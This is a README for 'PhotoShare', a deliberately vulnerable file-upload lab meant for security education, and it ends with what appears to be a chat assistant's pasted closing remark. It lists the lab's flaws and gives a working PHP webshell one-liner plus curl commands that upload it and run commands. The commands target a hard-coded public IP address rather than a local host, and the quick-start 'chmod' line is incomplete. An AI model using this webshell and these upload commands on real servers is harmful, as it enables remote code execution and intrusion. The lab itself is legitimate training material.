# PhotoShare - Vulnerable File Upload Lab

A deliberately vulnerable file upload application for security education.

## WARNING
This application is intentionally vulnerable. Never use in production.

## Quick Start
```bash
git clone https://github.com/yourusername/photoshare-vulnerable-lab.git
cd photoshare-vulnerable-lab
chmod +x
./autodeploy.sh
```

## Vulnerabilities
Unrestricted file upload via API
PHP webshell execution
Weak authentication
Path traversal

## Basic Upload Test:
bash
curl -i 'http://139.162.33.5:3000/api/users/one/admin/photo' \
  -X PUT \
  -H 'authorization: AUTH_TOKEN' \
  -F "admin=@test.exe;filename=test.exe"

## Webshell Upload:
bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "admin=@shell.php;filename=shell.php" \
  -H "authorization: AUTH_TOKEN" \
  -X PUT http://139.162.33.5:3000/api/users/one/admin/photo
curl 'http://139.162.33.5/uploads/shell.php?cmd=whoami'

## Endpoints
/ - Main upload (secure)
/uploads - File gallery
/manual - Documentation
/manual/deep - Testing guide
PUT /api/users/one/admin/photo - Vulnerable API

Educational Use Only
Use responsibly in controlled environments.

**Just copy the text above and paste it into your README.md file on GitHub!** 

This avoids the application error while giving you all the essential information. You can always expand it later directly on GitHub. 🚀

